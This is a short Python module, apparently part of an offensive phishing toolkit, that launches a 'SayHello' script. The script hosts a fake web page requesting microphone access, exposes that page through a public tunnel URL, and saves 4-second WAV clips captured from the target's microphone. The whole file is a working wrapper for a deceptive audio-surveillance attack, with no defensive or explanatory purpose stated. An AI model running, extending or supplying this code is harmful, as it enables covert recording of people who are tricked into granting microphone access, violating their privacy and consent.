import subprocess
from pathlib import Path
from ..utils import load_config, save_result, timestamp
from ..tunnel.manager import get_public_url

cfg = load_config()
SAYHELLO_DIR = cfg["tool_paths"]["sayhello"]


def run(dry_run: bool = False) -> dict:
    script = str(Path(SAYHELLO_DIR) / "sayhello.sh")

    if dry_run:
        data = {
            "module": "phishing.audio",
            "dry_run": True,
            "timestamp": timestamp(),
            "status": "dry_run_ok",
            "script": script,
            "note": "Hosts a fake page requesting microphone access; sends 4-sec WAV clips back",
        }
        save_result("phishing_audio", data)
        return data

    proc = subprocess.Popen(
        ["bash", script],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        cwd=SAYHELLO_DIR,
    )
    try:
        proc.communicate(input="\n", timeout=20)
    except subprocess.TimeoutExpired:
        pass

    public_url = get_public_url()
    data = {
        "module": "phishing.audio",
        "timestamp": timestamp(),
        "public_url": public_url,
        "pid": proc.pid,
        "note": "4-second WAV clips captured from target microphone saved in SayHello directory",
    }
    save_result("phishing_audio", data)
    return data
